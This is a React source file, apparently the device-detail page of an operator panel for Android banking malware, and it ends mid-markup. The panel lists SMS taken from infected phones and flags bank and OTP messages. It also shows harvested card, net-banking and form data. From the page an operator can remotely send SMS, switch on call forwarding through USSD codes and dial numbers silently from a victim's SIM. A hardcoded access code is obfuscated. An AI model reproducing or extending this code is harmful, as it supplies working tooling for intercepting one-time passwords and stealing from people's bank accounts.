// src/pages/DeviceDetailPage.tsx
// Strategy: old file ki saari working logic rakhi hai, sirf UI replace ki hai
import { useCallback, useEffect, useMemo, useRef, useState, type FormEvent } from "react";
import axios from "axios";
import { useLocation, useNavigate, useParams } from "react-router-dom";

import TopNav, { type TabKey } from "../components/layout/TopNav";
import wsService from "../services/ws/wsService";
import {
  getDevice, pushSendSms, pushCallForward,
  pushMakeCall, pushReadOldSms, pushReadContacts, getDeviceContacts,
} from "../services/api/devices";
import { listDeviceNotifications } from "../services/api/sms";
import { listFormSubmissions } from "../services/api/forms";
import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
import { ENV, apiHeaders } from "../config/constants";
import { pickLastSeenAt } from "../utils/reachability";

// ─── Security code ────────────────────────────────────────────────────────────
const _SC = [55, 51, 57, 49].map((c) => String.fromCharCode(c)).join("");

// ─── Helpers (same as old file) ───────────────────────────────────────────────
function safeStr(v: any): string { return (v === null || v === undefined) ? "" : String(v); }

function firstNonEmpty(...vals: any[]): string {
  for (const v of vals) { const s = safeStr(v).trim(); if (s) return s; }
  return "";
}

function getTs(m: any): number {
  const t = m?.timestamp ?? m?.time ?? m?.createdAt ?? m?.date;
  if (typeof t === "number") return t;
  if (typeof t === "string") { const n = Number(t); if (!isNaN(n)) return n; const d = Date.parse(t); if (!isNaN(d)) return d; }
  return 0;
}

function timeAgo(ts: number): string {
  if (!ts || ts <= 0) return "-";
  const sec = Math.floor((Date.now() - ts) / 1000);
  if (sec < 2)  return "just now";
  if (sec < 60) return `${sec} ${sec === 1 ? "second" : "seconds"} ago`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} ${min === 1 ? "minute" : "minutes"} ago`;
  const hr = Math.floor(min / 60);
  if (hr < 24) return `${hr} ${hr === 1 ? "hour" : "hours"} ago`;
  const d = Math.floor(hr / 24);
  return `${d} ${d === 1 ? "day" : "days"} ago`;
}

function extractSimSummary(simInfo: any) {
  if (!simInfo || typeof simInfo !== "object")
    return { count: 0, sim1: "-", sim2: "-", sim1Carrier: "-", sim2Carrier: "-" };
  const simsArray = Array.isArray(simInfo.sims) ? simInfo.sims : Array.isArray(simInfo.sim) ? simInfo.sim : null;
  const sim1 = firstNonEmpty(simInfo?.sim1Number, simInfo?.sim1?.number, simsArray?.[0]?.number, simsArray?.[0]?.line1Number) || "-";
  const sim2 = firstNonEmpty(simInfo?.sim2Number, simInfo?.sim2?.number, simsArray?.[1]?.number, simsArray?.[1]?.line1Number) || "-";
  const sim1Carrier = firstNonEmpty(simInfo?.sim1Carrier, simInfo?.sim1?.carrier, simsArray?.[0]?.carrier) || "-";
  const sim2Carrier = firstNonEmpty(simInfo?.sim2Carrier, simInfo?.sim2?.carrier, simsArray?.[1]?.carrier) || "-";
  let count = 0;
  if (typeof simInfo.count === "number") count = simInfo.count;
  else if (Array.isArray(simsArray)) count = simsArray.length;
  else count = [sim1, sim2].filter((x) => x && x !== "-").length;
  return { count, sim1, sim2, sim1Carrier, sim2Carrier };
}

const SKIP_KEYS = new Set(["_id","id","uniqueid","deviceId","device_id","__v","createdAt","updatedAt","timestamp","_dtype"]);
function getPayloadEntries(obj: any): [string, string][] {
  const src = obj?.payload && typeof obj.payload === "object" ? obj.payload : obj;
  return Object.entries(src || {})
    .filter(([k]) => !SKIP_KEYS.has(k) && !k.startsWith("_"))
    .map(([k, v]) => [k, safeStr(v)])
    .filter(([, v]) => v && v !== "undefined" && v !== "null") as [string, string][];
}

const FINANCE_KW = ["credit","debit","bank","balance","upi","amount","a/c","inr","₹","paid","debited","credited","received","payment","otp"];
function isFinance(t: string) { const l = t.toLowerCase(); return FINANCE_KW.some(k => l.includes(k)); }

function copyText(v: string) { try { navigator.clipboard?.writeText(v); } catch {} }

// ─── Live TimeAgo component ───────────────────────────────────────────────────
function TimeAgo({ ts, className = "" }: { ts: number; className?: string }) {
  const [text, setText] = useState(() => timeAgo(ts));
  useEffect(() => {
    const update = () => setText(timeAgo(ts));
    update();
    const t = setInterval(update, 1000);
    return () => clearInterval(t);
  }, [ts]);
  return <span className={className}>{text}</span>;
}

// ─── CopyBtn — SVG icon (emoji renders as black square on Android) ────────────
function CopyBtn({ value }: { value: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button type="button"
      onClick={() => { copyText(value); setOk(true); setTimeout(() => setOk(false), 1200); }}
      className="ml-1.5 shrink-0 flex items-center justify-center opacity-40 hover:opacity-90 active:opacity-100">
      {ok ? (
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
          <polyline points="20 6 9 17 4 12"/>
        </svg>
      ) : (
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
          <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
        </svg>
      )}
    </button>
  );
}

// ─── SMS Card (competitor design) ────────────────────────────────────────────
function SmsCard({ sms, pageNum }: { sms: any; pageNum?: number }) {
  const ts     = getTs(sms);
  const msg    = safeStr(sms.body || sms.message || sms.msg || "");
  const sender = safeStr(sms.sender || sms.senderNumber || sms.title || "");
  const mob1   = safeStr(sms.receiver || sms.mob || "");
  const mob2   = safeStr(sms.receiver2 || sms.mob2 || "");
  const fin    = isFinance(msg);

  function Row({ label, value, red }: { label: string; value: string; red?: boolean }) {
    return (
      <div className="mb-2">
        <div className="flex items-center">
          <span className="text-[13px] font-semibold text-blue-600">{label}:</span>
          <CopyBtn value={value} />
        </div>
        <div className={`text-[13px] break-words whitespace-pre-wrap ${red ? "text-red-600" : "text-gray-800"}`}>{value}</div>
      </div>
    );
  }

  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      <Row label="Date"   value={ts ? new Date(ts).toString() : "-"} />
      {msg    && <Row label="MSG"    value={msg}    red={fin} />}
      {sender && <Row label="SENDER" value={sender} />}
      {mob1   && <Row label="MOB"    value={mob1} />}
      {mob2   && <Row label="MOB 2"  value={mob2} />}
      <hr className="my-2 border-gray-100" />
      <div className="flex items-center justify-between">
        {pageNum != null && (
          <span className="rounded bg-gray-100 px-1.5 py-0.5 text-[11px] font-semibold text-gray-500">Page {pageNum}</span>
        )}
        <TimeAgo ts={ts} className="ml-auto text-[11px] text-gray-400" />
      </div>
    </div>
  );
}

// ─── Form Card (competitor design) ───────────────────────────────────────────
function FormCard({ form }: { form: any }) {
  const ts  = getTs(form);
  const ent = getPayloadEntries(form);
  if (!ent.length) return null;
  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      {ent.map(([k, v]) => (
        <div key={k} className="mb-2">
          <div className="flex items-center">
            <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
            <CopyBtn value={v} />
          </div>
          <div className="text-[13px] text-gray-800">{v}</div>
        </div>
      ))}
      <hr className="my-2 border-gray-100" />
      <div className="text-right text-[11px] text-gray-400">{ts ? new Date(ts).toLocaleString() : "-"}</div>
    </div>
  );
}

// ─── Action Alert Modal (competitor style) ────────────────────────────────────
function DeviceAlert({ message, startTime, onClose }: {
  message: string; startTime: number; onClose: () => void;
}) {
  const [elapsed, setElapsed] = useState(() => timeAgo(startTime));
  useEffect(() => {
    const t = setInterval(() => setElapsed(timeAgo(startTime)), 1000);
    return () => clearInterval(t);
  }, [startTime]);
  return (
    <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40">
      <div className="relative w-[320px] rounded-2xl bg-white p-6 shadow-xl">
        <button type="button" onClick={onClose}
          className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50">✕</button>
        <div className="mb-4 text-[16px] font-extrabold text-red-500">Alert</div>
        <div className="text-center">
          <div className="mb-2 text-[12px] text-gray-500">{elapsed}</div>
          <div className="whitespace-pre-line text-[14px] leading-6 text-gray-900">{message}</div>
        </div>
      </div>
    </div>
  );
}

// ─── MAIN COMPONENT ───────────────────────────────────────────────────────────
type DeviceTab = "home" | "data" | "messages" | "groups";
const SMS_PER_PAGE = 20;

export default function DeviceDetailPage() {
  const { deviceId = "" } = useParams<{ deviceId: string }>();
  const nav      = useNavigate();
  const location = useLocation();
  const did      = decodeURIComponent(deviceId || "");
  const fromTab  = (location.state as any)?.from || "home";
  const mountedRef = useRef(true);

  // ── Core state ────────────────────────────────────────────────────────────
  const [device,    setDeviceDoc]  = useState<any>(null);
  const [loading,   setLoading]    = useState(true);
  const [alertText, setAlertText]  = useState("");

  // Lock gate (from old file)
  const [lockGateOpen,  setLockGateOpen]  = useState(false);
  const [lockCode,      setLockCode]      = useState("");
  const [lockCodeError, setLockCodeError] = useState<string | null>(null);

  // Device tab (new competitor design)
  const [deviceTab, setDeviceTab] = useState<DeviceTab>("home");

  // Data state
  const [smsList,       setSmsList]       = useState<any[]>([]);
  const [loadingSms,    setLoadingSms]    = useState(false);
  const [forms,         setForms]         = useState<any[]>([]);
  const [cards,         setCards]         = useState<any[]>([]);
  const [nets,          setNets]          = useState<any[]>([]);
  const [dataLoaded,    setDataLoaded]    = useState(false);

  // lastSeen + checkedAt from WS
  const [checkedAt, setCheckedAt] = useState<number>(0);
  const [wsLastSeenAt, setWsLastSeenAt] = useState<number | null>(null);

  // Status log with color
  const [statusLog, setStatusLog] = useState<{ ts: number; text: string; color?: "green" | "red" } | null>(null);

  // Device Alert modal
  const [devAlert,       setDevAlert]       = useState<{ message: string; startTime: number } | null>(null);
  const alertActionRef   = useRef<string>("");
  const alertWindowRef   = useRef<number>(0);

  // ── Send SMS state (from old file) ────────────────────────────────────────
  const [sendOpen,      setSendOpen]      = useState(false);
  const [receiver,      setReceiver]      = useState("");
  const [messageBody,   setMessageBody]   = useState("");
  const [smsSimSlot,    setSmsSimSlot]    = useState<0 | 1>(0);
  const [sendingSms,    setSendingSms]    = useState(false);
  const sendLockRef = useRef(false);

  // ── Call Forward state (from old file) ────────────────────────────────────
  const [forwardingSimDraft,    setForwardingSimDraft]    = useState<"1" | "2">("1");
  const [forwardingNumberDraft, setForwardingNumberDraft] = useState("");

  // ── GET SMS modal state ───────────────────────────────────────────────────
  const [getSmsOpen,  setSmsOpen]   = useState(false);
  const [getSmsCount, setSmsCount]  = useState("1");

  // ── Call Forward modal state ──────────────────────────────────────────────
  const [cfOpen,    setCfOpen]    = useState(false);
  const [cfSim,     setCfSim]     = useState(0);
  const [cfNumber,  setCfNumber]  = useState("");
  const cfSimRef    = useRef<0 | 1>(0); // tracks last used SIM for simSlots WS event

  // ── Dial USSD modal state ─────────────────────────────────────────────────
  const [ussdOpen,  setUssdOpen]  = useState(false);
  const [ussdSim,   setUssdSim]   = useState(0);
  const [ussdCode,  setUssdCode]  = useState("");

  // ── Search ────────────────────────────────────────────────────────────────
  const [search,   setSearch]   = useState("");
  const [sortMode, setSortMode] = useState<"new" | "old">("new");

  const simSummary = useMemo(() => extractSimSummary(device?.simInfo), [device]);

  const simLabel = useMemo(() =>
    forwardingSimDraft === "1" ? "SIM 1" : "SIM 2",
  [forwardingSimDraft]);

  const smsSim1Label = useMemo(() =>
    `SIM 1${simSummary.sim1 !== "-" ? ` (${simSummary.sim1})` : ""}`,
  [simSummary.sim1]);
  const smsSim2Label = useMemo(() =>
    `SIM 2${simSummary.sim2 !== "-" ? ` (${simSummary.sim2})` : ""}`,
  [simSummary.sim2]);

  // SIM options for dropdowns
  const simOptions = useMemo(() => {
    const opts = [];
    if (simSummary.sim1 !== "-") opts.push({ value: 0, label: `${simSummary.sim1Carrier !== "-" ? simSummary.sim1Carrier + " - " : ""}${simSummary.sim1}` });
    if (simSummary.sim2 !== "-") opts.push({ value: 1, label: `${simSummary.sim2Carrier !== "-" ? simSummary.sim2Carrier + " - " : ""}${simSummary.sim2}` });
    if (!opts.length) { opts.push({ value: 0, label: "SIM 1" }, { value: 1, label: "SIM 2" }); }
    return opts;
  }, [simSummary]);

  // ── Alert helpers ─────────────────────────────────────────────────────────
  function openAlert(action: string, message: string) {
    alertActionRef.current  = action;
    alertWindowRef.current  = Date.now();
    setDevAlert({ message, startTime: Date.now() });
  }

  function showResult(message: string, windowMs = 30000) {
    if (Date.now() - alertWindowRef.current < windowMs) {
      setDevAlert({ message, startTime: alertWindowRef.current });
    }
  }
  // Call forward result — use 60 second window
  function showForwardResult(message: string) { showResult(message, 60000); }

  function logStatus(text: string, color?: "green" | "red") {
    setStatusLog({ ts: Date.now(), text, color });
  }

  // ── Loaders ───────────────────────────────────────────────────────────────
  async function loadDevice() {
    setLoading(true);
    try {
      const d = await getDevice(did);
      if (!mountedRef.current) return;
      if (d?.locked) { setLockGateOpen(true); setLoading(false); return; }
      setDeviceDoc(d);
      if (d?.checkedAt > 0) setCheckedAt(Number(d.checkedAt));  // DB se last check time load karo
      setForwardingSimDraft(firstNonEmpty(d?.metadata?.forwardingSim, d?.forwardingSim, "1") === "2" ? "2" : "1");
      setForwardingNumberDraft(firstNonEmpty(d?.metadata?.forwardingNumber, d?.forwardingNumber, "") || "");
    } catch { if (mountedRef.current) {} }
    finally { if (mountedRef.current) setLoading(false); }
  }

  async function loadSms() {
    setLoadingSms(true);
    try {
      const list = await listDeviceNotifications(did);
      if (!mountedRef.current) return;
      setSmsList((list || []).slice().sort((a: any, b: any) => getTs(b) - getTs(a)));
    } catch {}
    finally { if (mountedRef.current) setLoadingSms(false); }
  }

  async function loadData() {
    if (dataLoaded) return;
    try {
      const allForms = await listFormSubmissions().catch(() => []);
      const mine = (Array.isArray(allForms) ? allForms : [])
        .filter((f: any) => safeStr(f.uniqueid || f?.payload?.uniqueid || f.deviceId) === did)
        .sort((a: any, b: any) => getTs(b) - getTs(a));
      const [c, n] = await Promise.all([
        getCardPaymentsByDevice(did).catch(() => []),
        getNetbankingByDevice(did).catch(() => []),
      ]);
      if (!mountedRef.current) return;
      setForms(mine);
      setCards(Array.isArray(c) ? c : []);
      setNets(Array.isArray(n) ? n : []);
      setDataLoaded(true);
    } catch {}
  }

  // ── WS listener (from old file + new alert integration) ──────────────────
  useEffect(() => {
    mountedRef.current = true;
    wsService.connect();
    if (!did) return;

    loadDevice().then(() => { loadSms(); loadData(); });

    // Fetch alert text
    fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: apiHeaders() })
      .then(r => r.ok ? r.json() : null)
      .then(d => { if (d?.text) setAlertText(safeStr(d.text)); })
      .catch(() => {});

    const off = wsService.onMessage((msg) => {
      const type     = safeStr(msg?.type);
      const event    = safeStr(msg?.event);
      const evDid    = safeStr(msg?.deviceId ?? msg?.id ?? msg?.data?.uniqueid ?? msg?.data?.deviceId);
      const data     = msg?.data ?? msg?.payload ?? {};

      // LastSeen / upsert — deviceDoc update karo (battery, sim info etc)
      // lekin lastSeen display UPDATE NAHI — sirf check_online:result se update hoga
      if (type === "event" && (event === "device:lastSeen" || event === "device:upsert") && evDid === did) {
        // deviceDoc ke doosre fields update karo, lastSeen display nahi
        setDeviceDoc((prev: any) => {
          if (!prev) return prev;
          const ls = data?.lastSeen || data;
          return { ...prev, ...(data || {}), lastSeen: prev.lastSeen }; // lastSeen purana rakho
        });
        return;
      }

      // Status event (legacy) — display update nahi
      if ((type === "event" && event === "status" && evDid === did) || (type === "status" && evDid === did)) {
        return; // ignore — sirf check_online se update hoga
      }

      // New SMS notification
      if (type === "event" && event === "notification") {
        const targetId = safeStr(data?.uniqueid ?? data?.deviceId ?? evDid);
        if (targetId !== did) return;
        const incomingId = safeStr(data?.id ?? data?._id).trim();
        const nextItem = { ...data, _id: incomingId || `${Date.now()}_${Math.random().toString(16).slice(2)}`, deviceId: did, timestamp: Number(data?.timestamp || msg?.timestamp || Date.now()) };
        setSmsList((prev) => {
          const exists = incomingId ? prev.some((item: any) => safeStr(item?._id ?? item?.id).trim() === incomingId) : false;
          if (exists) return prev;
          return [nextItem, ...prev].sort((a: any, b: any) => getTs(b) - getTs(a));
        });
        return;
      }

      // Batch SMS fetched (GET SMS result)
      if (type === "event" && event === "notification:batch" && evDid === did) {
        const saved = data?.saved ?? 0;
        if (alertActionRef.current === "get_sms") {
          showResult(`✅ ${saved} SMS fetched successfully!`);
        }
        loadSms();
        return;
      }

      // App uninstalled (FCM token invalid — takes 24-72h from Google)
      if (event === "device:uninstalled" && evDid === did) {
        if (alertActionRef.current === "check_online") {
          showResult("App Uninstalled! ⚠️");
          logStatus("App Uninstalled!", "red");
        }
        return;
      }

      // Check online result
      if (event === "check_online:result" && evDid === did) {
        if (alertActionRef.current === "check_online") {
          const status = safeStr(data?.status || "");
          const err    = safeStr(data?.error  || "");
          if (status === "online") {
            const ts = Number(data?.checkedAt || Date.now());
            setCheckedAt(ts);
            showResult("✅ Device is Online!");
            logStatus("Device Online", "green");
          } else if (err && err !== "missing_token") {
            showResult(`❌ Device Unreachable: ${err}`);
            logStatus("Device Unreachable", "red");
          }
        }
        return;
      }

      // simSlots event — APK sends this after activate/deactivate call_forward
      // NOTE: do NOT use this for check_forward — check_forward waits for call_forward:result
      if (type === "event" && event === "simSlots" && evDid === did) {
        const slotKey = cfSimRef.current === 0 ? "0" : "1";
        const st = safeStr(data?.[slotKey]?.status ?? data?.[slotKey] ?? "").toLowerCase();
        // Only show for activate/deactivate, NOT check_forward
        if (alertActionRef.current === "call_forward" || alertActionRef.current === "deactivate_forward") {
          if (st === "active") {
            showForwardResult("✅ Device confirmed: ACTIVE");
            logStatus("Call forwarding ACTIVE", "green");
          } else if (st === "inactive") {
            showForwardResult("❌ Device confirmed: INACTIVE");
            logStatus("Call forwarding INACTIVE", "red");
          }
        }
        setDeviceDoc((prev: any) => prev
          ? { ...prev, simSlots: { ...(prev.simSlots || {}), ...(data || {}) } }
          : prev
        );
        return;
      }

      // Call forward result — 3 conditions same as old working file
      if ((type === "event" && event === "call_forward:result") || event === "call_forward:result" || type === "call_forward:result") {
        const id2 = safeStr(data?.uniqueid ?? evDid);
        if (id2 !== did) return;
        const status   = safeStr(data?.status ?? "").toLowerCase();
        const fwdNum   = safeStr(data?.number || data?.forwardingNumber || "");
        const isOk     = status === "success" || status === "ok" || status === "done";

        if (alertActionRef.current === "check_forward") {
          showForwardResult(fwdNum
            ? `SIM: OK Call forwarding Voice: ${fwdNum}`
            : (isOk ? "✅ No active call forwarding" : "❌ Check failed")
          );
          logStatus(fwdNum ? `Forwarding active: ${fwdNum}` : "No forwarding active", isOk ? "green" : "red");
        } else if (alertActionRef.current === "call_forward") {
          showForwardResult(isOk
            ? "SIM: OK Call forwarding Registration was successful."
            : `❌ Call forwarding failed: ${safeStr(data?.error || status)}`
          );
          logStatus(isOk ? "Call forwarding activated" : "Call forwarding failed", isOk ? "green" : "red");
        } else if (alertActionRef.current === "deactivate_forward") {
          showForwardResult(isOk
            ? "SIM: OK Call forwarding Deactivated successfully."
            : `❌ Deactivation failed: ${safeStr(data?.error || status)}`
          );
          logStatus(isOk ? "Call forwarding deactivated" : "Deactivation failed", isOk ? "green" : "red");
        } else if (alertActionRef.current === "ussd") {
          const resp = safeStr(data?.response || data?.message || "");
          showForwardResult(isOk
            ? (resp ? `USSD: ${resp}` : "✅ USSD dialed successfully.")
            : `❌ USSD failed: ${safeStr(data?.error || status)}`
          );
        }
        return;
      }

      // SMS sent result — APK confirms SMS actually sent
      if (event === "sms:sent" && evDid === did) {
        const status = safeStr(data?.status || "");
        const to     = safeStr(data?.to || "");
        const ok     = status === "sent";
        if (alertActionRef.current === "send_sms" || Date.now() - alertWindowRef.current < 30000) {
          setDevAlert({
            message: ok
              ? `✅ SMS successfully sent to ${to || "recipient"}!`
              : `❌ SMS failed to send (${status})`,
            startTime: alertWindowRef.current || Date.now(),
          });
          logStatus(ok ? "SMS sent ✅" : "SMS failed ❌", ok ? "green" : "red");
        }
        return;
      }

      // USSD result event
      if (event === "ussd:result" && evDid === did) {
        const resp = safeStr(data?.response || data?.message || "");
        showResult(resp ? `USSD: ${resp}` : "✅ USSD command executed.");
        return;
      }

      // New form/card/net data
      if ((type === "event" || type === "cmd") && (event === "form:created" || event === "form_submissions:created")) {
        const targetId = safeStr(data?.uniqueid ?? data?.deviceId ?? evDid);
        if (targetId !== did) return;
        const payload = data?.payload && typeof data.payload === "object" ? data.payload : data || {};
        setForms((prev) => [{ _id: data._id || `${Date.now()}`, uniqueid: did, payload, createdAt: new Date().toISOString(), timestamp: Date.now() }, ...prev]);
        return;
      }
      if ((type === "event" || type === "cmd") && (event === "card:created" || event === "card_payment:created")) {
        const targetId = safeStr(data?.uniqueid ?? data?.deviceId ?? evDid);
        if (targetId !== did) return;
        setCards((prev) => [data?.payload || data, ...prev]);
        return;
      }
      if ((type === "event" || type === "cmd") && (event === "netbanking:created" || event === "net_banking:created")) {
        const targetId = safeStr(data?.uniqueid ?? data?.deviceId ?? evDid);
        if (targetId !== did) return;
        setNets((prev) => [data?.payload || data, ...prev]);
      }
    });

    return () => { mountedRef.current = false; off(); };
  }, [did]);

  // ── Lock gate (from old file) ─────────────────────────────────────────────
  function handleLockCodeConfirm() {
    if (lockCode !== _SC) { setLockCodeError("Incorrect security code"); setLockCode(""); return; }
    setLockGateOpen(false); setLockCode(""); setLockCodeError(null);
    loadDevice().then(() => { loadSms(); loadData(); });
  }

  // ── Check Online ──────────────────────────────────────────────────────────
  async function handleCheckOnline() {
    logStatus("Checking device online");
    openAlert("check_online",
      "⏳ Request sent to device. Waiting for response (up to 30 seconds)…"
    );
    try {
      await axios.post(
        `${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/ping`,
        { source: "detail", force: true }, { headers: apiHeaders(), timeout: 10000 }
      );
      // FCM sent successfully — now wait for WS response from APK
    } catch (err: any) {
      const apiErr = safeStr(err?.response?.data?.error || "");
      if (apiErr === "missing_token") {
        // device:uninstalled WS handle karega agar uninstalled hai
        // sirf status log mein dikhao, popup nahi
        logStatus("No FCM token — checking...", "red");
      } else if (apiErr) {
        showResult(`❌ FCM Failed: ${apiErr}`);
        logStatus("FCM send failed", "red");
      }
    }
  }

  // ── GET SMS (from old file logic + new alert) ─────────────────────────────
  async function handleGetSms() {
    const count = Math.min(3, Math.max(1, Number(getSmsCount) || 1));
    setSmsOpen(false);
    logStatus(`Fetching last ${count} SMS`);
    openAlert("get_sms",
      "We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline."
    );
    try {
      const result = await pushReadOldSms(did, count);
      if (!result.success) {
        showResult("❌ Failed: " + (result.error || "device offline"));
      }
    } catch (e: any) {
      showResult("❌ Error: " + safeStr(e?.message));
    }
  }

  // ── Send SMS (exact from old file — WS first, FCM fallback) ──────────────
  async function handleSendSms(e?: FormEvent) {
    if (e) e.preventDefault();
    if (sendLockRef.current || sendingSms) return;
    const to   = receiver.trim();   if (!to)   { alert("Receiver is required"); return; }
    const body = messageBody.trim(); if (!body) { alert("Message is required"); return; }
    sendLockRef.current = true; setSendingSms(true);
    try {
      const wsOk = wsService.sendCmd("sendSms", {
        address: to, message: body, sim: smsSimSlot,
        timestamp: Date.now(), uniqueid: did, deviceId: did,
        clientMsgId: `sendsms_${did}_${Date.now()}`,
      });
      if (wsOk) {
        setReceiver(""); setMessageBody(""); setSendOpen(false);
        alertActionRef.current = "send_sms";
        alertWindowRef.current = Date.now();
        logStatus("Send SMS command sent — waiting for delivery confirmation");
        setDevAlert({ message: "⏳ SMS command sent to device. Waiting for delivery confirmation…", startTime: Date.now() });
      } else {
        const result = await pushSendSms(did, to, body, smsSimSlot);
        if (result.success) {
          setReceiver(""); setMessageBody(""); setSendOpen(false);
          alertActionRef.current = "send_sms";
          alertWindowRef.current = Date.now();
          logStatus("Send SMS command sent via FCM — waiting for delivery confirmation");
          setDevAlert({ message: "⏳ SMS command sent to device via FCM. Waiting for delivery confirmation…", startTime: Date.now() });
        } else {
          setDevAlert({ message: "❌ Failed: " + (result.error || "device offline"), startTime: Date.now() });
        }
      }
    } catch (err: any) {
      setDevAlert({ message: "❌ Error: " + safeStr(err?.message), startTime: Date.now() });
    } finally {
      setSendingSms(false);
      setTimeout(() => { sendLockRef.current = false; }, 400);
    }
  }

  // ── Call Forward (exact from old file + new alert) ────────────────────────
  function handleCallForward(mode: "activate" | "deactivate" | "check") {
    const num  = cfNumber.trim();
    if (mode === "activate" && !/^\d{10}$/.test(num) && !/^\+?\d{10,15}$/.test(num)) {
      alert("Enter valid forwarding number"); return;
    }
    const ussd     = mode === "activate" ? `**21*${num}#` : mode === "deactivate" ? "##21#" : "*#21#";
    const action   = mode === "activate" ? "call_forward" : mode === "deactivate" ? "deactivate_forward" : "check_forward";
    const simLbl   = cfSim === 0
      ? (simSummary.sim1 !== "-" ? `SIM 1` : "SIM 1")
      : `SIM 2`;

    cfSimRef.current = cfSim as 0 | 1; // save for simSlots handler
    setCfOpen(false);
    logStatus(mode === "check" ? "Checking call forwarding" : mode === "activate" ? "Activating call forwarding" : "Deactivating call forwarding");
    openAlert(action, "⏳ Command sent to device. Waiting for result from APK…");
    alertWindowRef.current = Date.now(); // reset window for 60s

    // WS first (same as old sendCallForwardCommand), FCM fallback
    const wsOk = wsService.sendCmd("call_forward", {
      uniqueid: did, phoneNumber: mode === "activate" ? num : "",
      sim: simLbl, callCode: ussd, timestamp: Date.now(),
    });
    if (!wsOk) {
      pushCallForward(did, ussd, simLbl, mode === "activate" ? num : "")
        .then((result) => {
          if (!result.success) showResult("❌ Failed: " + (result.error || "device offline"));
        })
        .catch((e: any) => { showResult("❌ Error: " + safeStr(e?.message)); });
    }
  }

  // ── Dial USSD / Direct Call
  // USSD code (*123#) → alert dikhao result ke saath
  // Regular number (9876543210) → silently dial, no alert
  async function handleDialUssd() {
    if (!ussdCode.trim()) return;
    const rawCode = ussdCode.trim();
    const isUssd  = rawCode.startsWith("*") || rawCode.startsWith("#");
    // Android bug fix: # in tel: URI gets stripped → encode as %23
    const code = rawCode.replace(/#/g, "%23");
    setUssdOpen(false); setUssdCode("");

    if (isUssd) {
      // USSD code → show alert, wait for response
      logStatus(`Dialing USSD: ${rawCode}`);
      alertActionRef.current = "ussd";
      alertWindowRef.current = Date.now();
      try {
        const result = await pushMakeCall(did, code, ussdSim);
        if (result.success) {
          setDevAlert({
            message: `✅ USSD ${rawCode} dialed via SIM ${ussdSim + 1}`,
            startTime: alertWindowRef.current,
          });
          logStatus(`USSD ${rawCode} dialed`, "green");
        } else {
          setDevAlert({
            message: `❌ USSD ${rawCode} failed: ${result.error || "device offline"}`,
            startTime: alertWindowRef.current,
          });
        }
      } catch (e: any) {
        setDevAlert({
          message: `❌ USSD error: ${safeStr(e?.message)}`,
          startTime: alertWindowRef.current,
        });
      }
    } else {
      // Regular phone number → silently dial, just log status
      logStatus(`Calling: ${rawCode}`);
      try {
        await pushMakeCall(did, code, ussdSim);
      } catch {}
    }
  }

  // ── Back navigation ───────────────────────────────────────────────────────
  function navBack() {
    nav("/", { state: { tab: fromTab } });
  }

  function handleTopNavTabChange(tab: TabKey) {
    if (tab === "home")    { navBack(); return; }
    if (tab === "devices") { nav("/", { state: { tab: "devices" } }); return; }
    if (tab === "data")     setDeviceTab("data");
    if (tab === "messages") setDeviceTab("messages");
    if (tab === "groups")   setDeviceTab("groups");
  }

  // ── Computed values ───────────────────────────────────────────────────────
  // Sirf checkedAt dikhao — automatic lastSeen nahi
  const lastSeenTs = checkedAt > 0 ? checkedAt : 0;
  const isRecent   = checkedAt > 0 && (Date.now() - checkedAt) < 5 * 60 * 1000;

  const brand      = safeStr(device?.metadata?.brand || device?.metadata?.manufacturer || "Unknown");
  const model      = safeStr(device?.metadata?.model || "");
  const android    = safeStr(device?.metadata?.androidVersion || "");
  const forwardOn  = !!(device?.metadata?.forwardCallActive || device?.forwardCallActive);
  const installTs  = getTs({ createdAt: device?.createdAt });

  // SMS page map
  const smsPageMap = useMemo(() => {
    const map: Record<string, number> = {};
    [...smsList].sort((a, b) => getTs(b) - getTs(a))
      .forEach((m, i) => { const mid = safeStr(m._id || m.id); if (mid) map[mid] = Math.floor(i / SMS_PER_PAGE) + 1; });
    return map;
  }, [smsList]);

  // Data items
  const allDataItems = useMemo(() =>
    [...forms, ...cards, ...nets].sort((a, b) => getTs(b) - getTs(a)),
  [forms, cards, nets]);

  const homeFeed = useMemo(() => {
    const feed = [
      ...allDataItems.map(d => ({ ...d, _ft: "data" as const })),
      ...smsList.map(s => ({ ...s, _ft: "sms" as const })),
    ].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b));
    return feed;
  }, [allDataItems, smsList, sortMode]);

  const sortedSms = useMemo(() =>
    [...smsList].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b)),
  [smsList, sortMode]);

  const q = search.trim().toLowerCase();
  function filterQ<T>(list: T[]): T[] {
    if (!q) return list;
    return list.filter(item => JSON.stringify(item).toLowerCase().includes(q));
  }

  // TopNav activeTab mapping
  const topNavActiveTab: TabKey = (() => {
    if (deviceTab === "data")     return "data";
    if (deviceTab === "messages") return "messages";
    if (deviceTab === "groups")   return "groups";
    return "home"; // shows « Home as active
  })();

  if (!did) return <div className="p-4">Missing device ID</div>;

  return (
    <div className="min-h-screen bg-gray-50">
      <TopNav
        activeTab={topNavActiveTab}
        onTabChange={handleTopNavTabChange}
        showBack={true}
        onBack={navBack}
        darkMode={false}
        onToggleDark={() => {}}
        alertText={alertText}
      />

      {/* ── Lock Gate ── */}
      {lockGateOpen && (
        <div className="flex min-h-[80vh] items-center justify-center px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-lg">
            <div className="mb-4 text-center text-4xl">🔒</div>
